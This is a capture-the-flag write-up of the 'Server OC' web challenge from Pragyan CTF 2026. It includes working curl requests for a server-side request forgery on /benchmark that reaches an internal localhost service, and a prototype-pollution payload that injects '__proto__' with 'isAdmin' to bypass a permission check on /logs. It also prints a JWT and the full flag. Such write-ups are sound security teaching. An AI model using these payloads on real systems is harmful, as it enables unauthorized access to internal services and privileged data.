# Server OC – Web Challenge Writeup

| Field | Value |
|-------|--------|
| **CTF** | Pragyan CTF 2026 |
| **Category** | Web |


**Description:**  
> Overclocking increases FPS, but for a SysAd, does it increase… Requests Per Second?  
>  
> The flag is in two parts.

Target URL:  `https://server-oc.ctf.prgy.in/`

- CPU multiplier control
- Benchmark functionality
- Internal configuration endpoint
- Logs endpoint protected by permissions

The two parts of the flag are obtained via **two independent vulnerabilities**.

---

## Reconnaissance
This is my one of the Favourite chall bcz it required me about 6 hours to figure out the solution :((
### robots.txt
Accessing `/robots.txt` reveals hardware-themed hints:
`CPU: Intel i9-9900K
Motherboard: Asus Z390`

This reinforces the overclocking theme but is not directly exploitable.

---

### Client-side JavaScript (`/script.js`)
Reviewing `script.js` reveals the application flow:

1. `POST /api/overclock` sets the CPU multiplier
2. At a specific multiplier, `showBe: true` enables **Run Benchmark**
3. Running the benchmark triggers:
   - `GET /api/benchmark/url`
   - an internal request to `/benchmark`
4. Under certain conditions, `/leConfig` is called
5. `/leConfig` issues a JWT hinting at `/logs`

---

### Benchmark Unlock
So meanwhile i was randomly guessing numbers from 1 to 100 at numbers 76 something strange happened....

Sending the following enables the benchmark button:

```bash
POST /api/overclock
Content-Type: application/json

{"multiplier":76}
```
Multiplier 76 is the “stable” value that unlocks the benchmark logic.

## Flag Part 2 – SSRF via /benchmark
**Root Cause**

The /benchmark endpoint behaves as an SSRF handler.
While it normally fetches a backend URL, it also checks for a direct internal query parameter.

This allows bypassing SSRF entirely.

### Exploitation

The server was making and GET request on this link 

`GET /benchmark?url=http://localhost:3001/benchmark?internal=flag`
```
curl https://server-oc.ctf.prgy.in/benchmark?url=http://localhost:3001/benchmark?internal=flag
It should be hiding here somewhere... 
```

after some path traversal we got into this\
`curl https://server-oc.ctf.prgy.in/benchmark?internal=flag`

Response:
`Flag : $h0ulD_N0T_T0uch_$3rv3rs}`

Flag Part 2 obtained

## Flag Part 1 – Privilege Bypass on /logs

Understanding `/leConfig`

Calling POST `/leConfig` after unlocking the benchmark issues a JWT cookie.
Decoding the JWT reveals:
**`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbmRwb2ludCI6Ii9sb2dzIiwiZXhhbXBsZVBheWxvYWQiOnsiUGF0aCI6IkM6XFxXaW5kb3dzXFxMb2dcXHN5c3RlbVJlc3RvcmUifSwiaWF0IjoxNzcwNjQzMjA0fQ.ksOxCRfFXfuDyLHLTNADLxuwYCRsA0hTJdXqgcIUFzo`**
```
{
  "endpoint": "/logs",
  "examplePayload": {
    "Path": "C:\\Windows\\Log\\systemRestore"
  }
}
```
#### This indicates:

- `/logs` is protected
- A Windows-style path is required
- Permissions are enforced server-side

### Problem

Even with:
- Valid session
- Multiplier set to 76
- JWT issued by /leConfig
- Correct Path The endpoint responds with:
`{"message":"Invalid user permissions"}`
So a permission bypass is required. **So this was hinting us to make some Privilege escalation**
### Vulnerability: Server-Side Prototype Pollution

The endpoint unsafely merges the JSON request body into an internal JavaScript object without filtering special keys.
By injecting __proto__, we can pollute the object prototype and influence permission checks.


```
 curl -s -X POST \
  -H 'Content-Type: application/json' \
  -d '{
        "Path": "C:\\Windows\\Log\\systemRestore",
        "__proto__": { "isAdmin": true }
      }' \
  https://server-oc.ctf.prgy.in/logs

  ```
  ```
{
  "message": "p_ctf{L!qU1d_H3L1um_"
  }
```
Flag Part 1 obtained

## Flag
`p_ctf{L!qU1d_H3L1um_$h0ulD_N0T_T0uch_$3rv3rs}`

| Part   | Vulnerability                   | Endpoint     |
| ------ | ------------------------------- | ------------ |
| Part 1 | Server-side prototype pollution | `/logs`      |
| Part 2 | SSRF logic flaw                 | `/benchmark` |

#### Takeaways

- Client-side flows often reveal hidden server logic
- SSRF endpoints may contain secondary logic paths
- Prototype pollution in JSON can bypass permission checks when objects are merged unsafely

PWN by **W4RR1OR**